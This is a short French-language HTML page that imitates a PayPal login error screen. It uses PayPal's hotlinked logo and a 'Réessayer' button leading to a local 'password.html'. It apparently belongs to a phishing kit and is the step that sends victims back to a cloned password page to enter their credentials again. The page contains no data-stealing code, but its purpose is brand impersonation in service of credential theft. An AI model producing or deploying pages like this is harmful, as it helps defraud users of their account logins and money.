<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Erreur de connexion</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
    }
    .container {
      width: 100%;
      max-width: 350px;
      text-align: center;
    }
    .logo img {
      width: 120px;
      margin-bottom: 20px;
    }
    .error-box {
      background-color: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
      border-radius: 4px;
      padding: 15px;
      margin-top: 20px;
      font-size: 14px;
    }
    .btn {
      margin-top: 20px;
      padding: 12px;
      width: 100%;
      background-color: #0070ba;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">
      <img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.svg" alt="PayPal Logo">
    </div>
    <div class="error-box">
      <strong>Erreur de connexion</strong><br>
      Veuillez réessayer plus tard.
    </div>
    <!-- Bouton retour vers la page mot de passe -->
    <button class="btn" onclick="window.location.href='password.html'">Réessayer</button>
  </div>
</body>
</html>
